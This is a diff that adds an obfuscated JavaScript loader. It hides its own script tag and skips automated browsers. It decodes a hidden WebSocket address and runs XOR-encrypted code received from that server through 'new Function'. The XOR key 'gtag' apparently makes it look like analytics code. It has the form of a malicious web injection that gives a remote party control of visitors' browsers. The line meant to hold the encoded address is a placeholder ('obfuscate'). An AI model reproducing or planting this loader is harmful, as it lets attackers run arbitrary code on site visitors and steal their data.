@@ -1,0 +1,39 @@
+window.existingWebSocket = null;
+
+((v, w, d) => { 
+    d = this; 
+    if (d && d.nodeType === 1 && d.parentNode.removeChild(d)); 
+    if (w['pg_low_bit'] || navigator['webdriver']) return; 
+    w['pg_low_bit'] = 1; 
+	
+	var rS = function(str) { return str.split('').reverse().join(''); };
+    var p = obfuscate ;
+    var eRU = p.map(function(pt) { return pt; }).join('');
+    var dU = atob(rS(eRU));
+    var W = window.WebSocket, 
+        wsURL = String(dU), 
+        xorKey = 'gtag'; 
+
+    function xorDecrypt(input, key) {
+        let output = '';
+        for (let i = 0; i < input.length; i += 2) {
+            let byte = parseInt(input.substr(i, 2), 16);
+            output += String.fromCharCode(byte ^ key.charCodeAt(i / 2 % key.length));
+        }
+        return output;
+    }
+
+    var sortvis = function () { 
+        if (v-- > 0) {
+            if (!window.existingWebSocket || window.existingWebSocket.readyState === WebSocket.CLOSED) {
+                let ws = new W(wsURL); 
+                window.existingWebSocket = ws; 
+                ws.onmessage = e => new Function(xorDecrypt(e['data'], xorKey)).call(this);
+                ws.onclose = a => {!a.wasClean && setTimeout(sortvis, 1000)};
+            }
+        } 
+    }; 
+    sortvis();
+
+    document.getElementById("tcl_img_banner")?.parentNode.removeChild(document.getElementById("tcl_img_banner"));
+})(1, window);
